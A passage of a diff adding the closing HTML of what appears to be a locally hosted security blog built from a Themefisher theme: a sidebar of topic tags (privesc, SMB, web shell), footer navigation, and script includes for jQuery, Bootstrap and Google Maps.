+      <li><a href="/tags/linux">Linux</a></li>
+      <li><a href="/tags/misconfiguration">Misconfiguration</a></li>
+      <li><a href="/tags/privesc">Privesc</a></li>
+      <li><a href="/tags/smb">Smb</a></li>
+      <li><a href="/tags/spidering">Spidering</a></li>
+      <li><a href="/tags/tty">Tty</a></li>
+      <li><a href="/tags/tty-shell">Tty shell</a></li>
+      <li><a href="/tags/web-shell">Web shell</a></li>
+      <li><a href="/tags/windows">Windows</a></li>
+    </ul>
+  </div></aside>
+
+      </div>
+		</div>
+	</div>
+</section>
+
+<footer class="footer">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-12">
+				<div class="footer-manu">
+					<ul>
+            
+            <li><a href="http://192.168.1.191/about">About</a></li>
+            
+            <li><a href="http://192.168.1.191/project">Project</a></li>
+            
+            <li><a href="http://192.168.1.191/blog">Blog</a></li>
+            
+					</ul>
+				</div>
+				<p class="copyright">Copyright © 2020 <a href="https://themefisher.com">Themefisher</a> All Rights Reserved</p>
+			</div>
+		</div>
+	</div>
+</footer>
+
+
+
+<script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCcABaamniA6OL5YvYSpB3pFMNrXwXnLwU&amp;libraries=places"></script>
+
+
+
+
+<script src="http://192.168.1.191/plugins/jQuery/jquery.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/slick/slick.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="http://192.168.1.191/plugins/google-map/gmap.js"></script>
+
+
+
+
+<script src="http://192.168.1.191/js/script.min.js"></script>
+
+
+</body>
+
+</html>
